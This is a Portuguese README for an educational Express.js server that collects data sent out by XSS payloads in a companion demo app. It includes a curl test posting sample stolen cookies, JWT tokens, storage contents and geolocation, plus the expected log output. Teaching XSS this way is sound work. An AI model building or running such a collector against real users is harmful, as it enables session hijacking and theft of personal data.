# Servidor de Webhook Local

## 📄 Descrição

Este é um **Servidor de Webhook Local** desenvolvido em **Node.js** utilizando o **Express.js**. Ele foi criado para receber e registrar dados enviados por scripts maliciosos injetados na aplicação principal. Este servidor é uma ferramenta educacional destinada a demonstrar a vulnerabilidade de **Cross-Site Scripting (XSS)** e como dados sensíveis podem ser extraídos por meio dela.

## 🛠️ Funcionalidades

- **Recepção de Dados:** Recebe requisições `POST` na rota `/webhook` contendo informações capturadas via scripts maliciosos.
- **CORS Configurado:** Permite requisições apenas da origem `http://localhost:3000` para garantir segurança e controle.
- **Registro Organizado:** Exibe os dados recebidos de forma estruturada no console para fácil análise.

## ⚙️ Instalação

### 1. Clonar o Repositório

Caso ainda não tenha clonado o repositório, faça isso utilizando o seguinte comando:

```bash
git clone https://github.com/cHIsIMun/Servidor-Malicioso.git
cd Servidor-Malicioso
```

### 2. Instalar Dependências

Instale todas as dependências necessárias utilizando o **npm**:

```bash
npm install
```

> **Nota:** O comando `npm install` já está configurado para instalar as dependências listadas no `package.json`.

## 🚀 Como Executar

Inicie o servidor de webhook local com o seguinte comando:

```bash
npm start
```

Após a execução, você verá a seguinte mensagem no terminal:

```
🔗 Servidor de Webhook rodando em http://localhost:4000
```

## 🧪 Como Testar

Para garantir que o servidor está funcionando corretamente, você pode realizar um teste simples:

1. **Enviar uma Requisição de Teste:**

   Utilize o seguinte comando **cURL** ou qualquer ferramenta de requisição HTTP (como **Postman**) para enviar uma requisição `POST` de teste:

   ```bash
   curl -X POST http://localhost:4000/webhook \
   -H "Content-Type: application/json" \
   -d '{
         "cookies": {
           "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
           "refreshToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
           "username": "usuario_teste"
         },
         "localStorage": {
           "theme": "dark",
           "cart": ["item1", "item2"]
         },
         "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
         "language": "pt-BR",
         "screenResolution": "1920x1080",
         "currentURL": "http://localhost:3000/product/1",
         "referer": "http://localhost:3000/products",
         "timestamp": "2024-04-27T14:23:45.678Z",
         "geolocation": {
           "latitude": 37.7749,
           "longitude": -122.4194
         },
         "sessionStorage": {
           "sessionKey": "abc123",
           "tempData": "xyz789"
         }
       }'
   ```

2. **Verificar o Registro no Servidor:**

   No terminal onde o servidor de webhook está rodando, você deverá ver uma saída semelhante a esta:

   ```
   📥 Dados Recebidos via Webhook:
   📍 IP do Cliente: ::1
   📆 Timestamp: 2024-04-27T14:23:45.678Z
   🧑‍💻 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
   🌐 URL Atual: http://localhost:3000/product/1
   🔗 Referer: http://localhost:3000/products
   🌐 Idioma: pt-BR
   📺 Resolução da Tela: 1920x1080
   📑 Cookies: { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6...', refreshToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6...', username: 'usuario_teste' }
   🗄️ LocalStorage: { theme: 'dark', cart: ['item1', 'item2'] }
   🗄️ SessionStorage: { sessionKey: 'abc123', tempData: 'xyz789' }
   📍 Geolocalização: { latitude: 37.7749, longitude: -122.4194 }
   -------------------------------------------
   ```

   Isso confirma que o servidor está recebendo e registrando os dados corretamente.

## 📋 Estrutura do Projeto

```
webhook-server/
├── node_modules/
├── webhook-server.js
├── package.json
└── package-lock.json
```

- **webhook-server.js:** Código principal do servidor de webhook.
- **package.json:** Lista de dependências e scripts do projeto.

## 🛡️ Considerações de Segurança

- **Ambiente de Desenvolvimento:** Este servidor é destinado **apenas** para ambientes de desenvolvimento e aprendizado. **Não** deve ser exposto a ambientes de produção ou públicos.
- **CORS Restrito:** Apenas requisições provenientes de `http://localhost:3000` são permitidas para aumentar a segurança.
- **Uso Responsável:** Utilize este servidor de forma ética e responsável, respeitando as leis e diretrizes de segurança.

## 📚 Recursos Adicionais

- **Express.js:** [https://expressjs.com/](https://expressjs.com/)
- **CORS Middleware para Express:** [https://github.com/expressjs/cors](https://github.com/expressjs/cors)
- **OWASP Top Ten:** [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
- **Cross-Site Scripting (XSS) no OWASP:** [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)

## 🤝 Contribuições

Contribuições são bem-vindas! Sinta-se à vontade para abrir issues ou enviar pull requests para melhorar este projeto.

## 📧 Contato

Para dúvidas ou sugestões, entre em contato com [lucas.oliv001@gmail.com](mailto:lucas.oliv001@gmail.com).

---